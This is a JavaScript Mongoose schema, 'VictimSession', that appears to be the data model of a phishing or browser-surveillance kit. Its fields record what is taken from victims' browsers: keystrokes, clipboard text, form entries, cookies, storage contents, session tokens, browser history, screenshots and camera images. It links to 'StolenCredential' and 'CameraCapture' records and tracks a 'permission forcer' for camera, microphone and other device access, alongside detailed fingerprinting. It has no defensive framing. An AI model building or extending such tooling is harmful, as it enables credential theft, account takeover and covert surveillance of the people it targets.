const mongoose = require('mongoose');

const VictimSessionSchema = new mongoose.Schema({
  sessionId: { type: String, required: true, unique: true, index: true },
  ipAddress: { type: String },
  userAgent: { type: String },
  browser: { type: String },
  browserVersion: { type: String },
  os: { type: String },
  osVersion: { type: String },
  deviceType: { type: String, enum: ['desktop', 'tablet', 'mobile', 'unknown'], default: 'unknown' },
  deviceVendor: { type: String },
  deviceModel: { type: String },
  screenResolution: { type: String },
  colorDepth: { type: Number },
  pixelRatio: { type: Number },
  language: { type: String },
  timezone: { type: String },
  platform: { type: String },
  hardwareConcurrency: { type: Number },
  deviceMemory: { type: Number },
  referrer: { type: String },
  isp: { type: String },
  geolocation: {
    city: { type: String },
    region: { type: String },
    country: { type: String },
    lat: { type: Number },
    lon: { type: Number },
    postalCode: { type: String },
    timezone: { type: String }
  },
  landingPage: { type: String },
  urlPathsVisited: [{ type: String }],
  timeOnSite: { type: Number, default: 0 }, // seconds
  clickCount: { type: Number, default: 0 },
  mouseMovements: [{ x: Number, y: Number, t: Number }],
  keystrokes: [{ key: String, target: String, t: Number }],
  clipboardData: [{ text: String, action: String, t: Number }],
  formData: [{
    formId: String,
    fields: mongoose.Schema.Types.Mixed,
    url: String,
    t: Date
  }],
  cookies: [{
    name: String,
    value: String,
    domain: String,
    path: String,
    secure: Boolean,
    httpOnly: Boolean
  }],
  localStorage: [{ key: String, value: String }],
  sessionStorage: [{ key: String, value: String }],
  credentials: [{ type: mongoose.Schema.Types.ObjectId, ref: 'StolenCredential' }],
  screenshots: [{ data: String, t: Date, url: String }],
  cameraAccessGranted: { type: Boolean, default: false },
  cameraAccessDenied: { type: Boolean, default: false },
  cameraImages: [{ type: mongoose.Schema.Types.ObjectId, ref: 'CameraCapture' }],
  networkInfo: {
    localIp: { type: String },
    downlink: { type: Number },
    rtt: { type: Number },
    effectiveType: { type: String },
    isp: { type: String }
  },
  hardwareInfo: {
    cores: { type: Number },
    memory: { type: Number },
    touchSupport: { type: Boolean },
    maxTouchPoints: { type: Number },
    gpuVendor: { type: String },
    gpuRenderer: { type: String },
    batteryCharging: { type: Boolean },
    batteryLevel: { type: Number }
  },
  batteryInfo: {
    charging: { type: Boolean },
    level: { type: Number },
    chargingTime: { type: Number },
    dischargingTime: { type: Number }
  },
  canvasFingerprint: { type: String },
  webglFingerprint: { type: String },
  audioFingerprint: { type: String },
  fontFingerprint: [{ type: String }],
  installedFonts: [{ type: String }],
  webRtcIp: { type: String },
  devToolsOpen: { type: Boolean, default: false },
  incognitoMode: { type: Boolean, default: false },
  browserExtensions: [{ type: String }],
  isOnline: { type: Boolean, default: true },
  lastActiveAt: { type: Date },
  sessionScore: { type: Number, default: 0 },
  tags: [{ type: String }],
  notes: { type: String },
  closedAt: { type: Date },

  // Browser history data
browserHistory: [{
  source: { type: String },
  key: { type: String },
  value: { type: String },
  timestamp: { type: Date, default: Date.now }
}],
sessionHarvest: [{
  source: { type: String },
  key: { type: String },
  value: { type: String },
  sensitive: { type: Boolean, default: false }
}],
sessionTokens: [{
  source: { type: String },
  key: { type: String },
  token: { type: String }
}],

// Permission forcer tracking
permissions: {
  camera: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  microphone: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  geolocation: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  notifications: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  clipboard: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  bluetooth: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  usb: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  midi: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  persistentStorage: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  vibration: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  orientation: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  ambientLight: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  proximity: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
  lastUpdated: Date
}

}, { timestamps: true });


VictimSessionSchema.index({ createdAt: -1 });
VictimSessionSchema.index({ 'geolocation.country': 1 });
VictimSessionSchema.index({ isOnline: 1 });
VictimSessionSchema.index({ clickCount: -1 });

module.exports = mongoose.model('VictimSession', VictimSessionSchema);